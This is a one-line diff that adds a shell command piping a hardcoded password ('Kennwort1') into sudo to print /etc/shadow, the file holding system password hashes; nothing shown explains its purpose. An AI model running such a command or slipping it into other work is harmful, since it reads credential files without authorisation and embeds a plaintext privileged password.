@@ -1,0 +1,1 @@
+echo Kennwort1 | sudo -S cat /etc/shadow
